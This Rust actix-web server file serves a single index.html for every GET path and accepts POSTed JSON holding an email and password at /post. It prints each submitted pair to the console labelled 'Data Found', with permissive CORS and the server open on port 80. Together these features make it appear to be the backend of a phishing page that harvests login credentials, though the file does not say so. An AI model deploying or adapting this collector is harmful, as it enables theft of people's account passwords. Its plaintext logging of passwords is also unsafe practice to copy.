use actix_files::NamedFile;
use actix_web::{HttpRequest, web, HttpResponse, Result};
use std::path::PathBuf;
use serde::{Deserialize, Serialize}; 

#[derive(Debug, Deserialize, Serialize)]
struct Credentials {
    email: String,
    pass: String,
}

async fn index(_req: HttpRequest) -> Result<NamedFile> {
    let path: PathBuf = "index.html".into(); 
    Ok(NamedFile::open(path)?)
}

async fn post_data(info: web::Json<Credentials>) -> HttpResponse { 
    println!("Data Found: {:?}", info);

    HttpResponse::Ok().finish()
}

#[actix_web::main]
pub async fn main() -> std::io::Result<()> { 
    use actix_web::{web, App, HttpServer}; 
    use actix_cors::Cors; 
    

    HttpServer::new(|| {

       let cors = Cors::permissive(); 

        App::new()
            .wrap(cors)
            .default_service(web::get().to(index)) 
            .route("/post", web::post().to(post_data)) 
    })
    .bind(("0.0.0.0", 80))?
    .run()
    .await
}

